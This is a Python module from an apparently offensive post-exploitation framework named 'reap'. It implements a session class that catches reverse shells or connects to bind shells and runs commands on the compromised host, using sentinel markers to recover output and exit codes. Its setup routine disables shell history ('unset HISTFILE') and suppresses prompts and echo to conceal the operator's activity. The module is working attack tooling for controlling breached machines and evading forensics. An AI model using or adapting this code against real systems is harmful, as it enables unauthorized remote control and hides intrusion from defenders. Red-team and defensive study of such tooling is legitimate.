"""RawShellSession — drive a raw caught shell (reverse or bind) as an exec channel.

reap normally wants a channel with clean command/output boundaries (SSH, WinRM,
webshell). A raw netcat-style shell has none. This wraps every command with a
high-entropy sentinel and reads the socket until the sentinel appears, recovering
the command's output and a real exit code — the same technique the webshell
adapter uses, applied to a TCP socket.

Best-effort by nature: there is no PTY, so interactive commands (a sudo password
prompt, an editor) do not work. reap only runs commands that return, so the
collection modules are fine. Prefer upgrading to SSH when you can; this is the
convenience path for when you can't.

Two modes:
  * connect  — reap dials out to a bind shell            (register bind <host> <port>)
  * listen   — reap listens and catches a reverse shell  (register listen <port>)
"""
from __future__ import annotations

import re
import secrets
import socket
import threading
import time
from typing import Optional

from .base import Result, Session


class RawShellSession(Session):
    def __init__(
        self,
        host: Optional[str] = None,
        port: Optional[int] = None,
        *,
        mode: str = "connect",
        shell: str = "sh",
        listen_host: str = "0.0.0.0",
        session_id: Optional[str] = None,
        accept_timeout: int = 180,
        connect_timeout: int = 15,
        sock: Optional[socket.socket] = None,
        prime: bool = True,
    ):
        self.shell = shell            # 'sh' | 'cmd'
        self._marker = "REAP_" + secrets.token_hex(8)
        self._lock = threading.Lock()

        if sock is not None:                      # injected (tests / advanced use)
            self._sock = sock
            self.host = host or "raw"
            self.session_id = session_id or f"raw:{self.host}"
        elif mode == "listen":
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((listen_host, int(port)))
            srv.listen(1)
            srv.settimeout(accept_timeout)
            try:
                self._sock, peer = srv.accept()   # blocks until the shell connects back
            finally:
                srv.close()
            self.host = host or peer[0]
            self.session_id = session_id or f"listen:{self.host}:{port}"
        else:                                     # connect to a bind shell
            self._sock = socket.create_connection((host, int(port)), timeout=connect_timeout)
            self.host = host
            self.session_id = session_id or f"bind:{host}:{port}"

        self._sock.settimeout(1.0)
        # The operator-side address the target reached us on — the natural
        # callback host for a chisel reverse tunnel (see transport.chisel).
        try:
            self.local_addr = self._sock.getsockname()[0]
        except Exception:
            self.local_addr = None
        if prime:
            self._prime()

    # -- internals -------------------------------------------------------------
    def _drain(self, secs: float = 0.5) -> str:
        """Read and discard whatever is buffered for up to `secs` (banner/prompt)."""
        end = time.monotonic() + secs
        old = self._sock.gettimeout()
        self._sock.settimeout(0.1)
        buf = b""
        try:
            while time.monotonic() < end:
                try:
                    chunk = self._sock.recv(65536)
                except socket.timeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                buf += chunk
        finally:
            self._sock.settimeout(old)
        return buf.decode("utf-8", "replace")

    def _prime(self) -> None:
        """Drain the connect banner and quiet the shell (kill the prompt, history,
        and — if a PTY snuck in — the input echo)."""
        self._drain(0.6)
        if self.shell == "sh":
            try:
                self._sock.sendall(
                    b"unset HISTFILE 2>/dev/null; export PS1='' PS2='' 2>/dev/null; "
                    b"stty -echo 2>/dev/null; echo\n")
            except OSError:
                pass
            self._drain(0.4)

    def _clean(self, out: str) -> str:
        # Drop any line that carries the marker (that is the shell echoing our
        # wrapped command back, if a PTY is echoing input) and trim blank edges.
        lines = [ln for ln in out.split("\n") if self._marker not in ln]
        return "\n".join(lines).strip("\r\n")

    # -- Session contract ------------------------------------------------------
    def exec(self, cmd: str, timeout: int = 30) -> Result:
        start = time.monotonic()
        with self._lock:
            self._drain(0.05)   # clear any leftover prompt from the previous command
            if self.shell == "cmd":
                wrapped = f"{cmd} & echo {self._marker}%errorlevel%\r\n"
                end_re = re.compile(re.escape(self._marker) + r"(-?\d+)")
            else:
                wrapped = f"{cmd}; printf '\\n{self._marker}%s\\n' \"$?\"\n"
                end_re = re.compile(r"(?m)^" + re.escape(self._marker) + r"(-?\d+)\s*$")
            try:
                self._sock.sendall(wrapped.encode("utf-8", "replace"))
            except OSError as exc:
                return Result("", f"send failed: {exc}", 1, time.monotonic() - start)

            buf = ""
            match = None
            deadline = time.monotonic() + timeout
            while time.monotonic() < deadline:
                try:
                    chunk = self._sock.recv(65536)
                except socket.timeout:
                    match = end_re.search(buf)
                    if match:
                        break
                    continue
                except OSError as exc:
                    return Result(self._clean(buf), f"recv failed: {exc}", 1,
                                  time.monotonic() - start)
                if not chunk:
                    break   # shell closed the connection
                buf += chunk.decode("utf-8", "replace")
                match = end_re.search(buf)
                if match:
                    break

            if not match:
                return Result(self._clean(buf), "sentinel not seen (shell slow or dead)",
                              124, time.monotonic() - start)
            code = int(match.group(1))
            return Result(self._clean(buf[:match.start()]), "", code,
                          time.monotonic() - start)

    def is_alive(self) -> bool:
        try:
            return self.exec("echo __alive__", timeout=8).out.strip().endswith("__alive__")
        except Exception:
            return False

    def close(self) -> None:
        try:
            self._sock.close()
        except Exception:
            pass
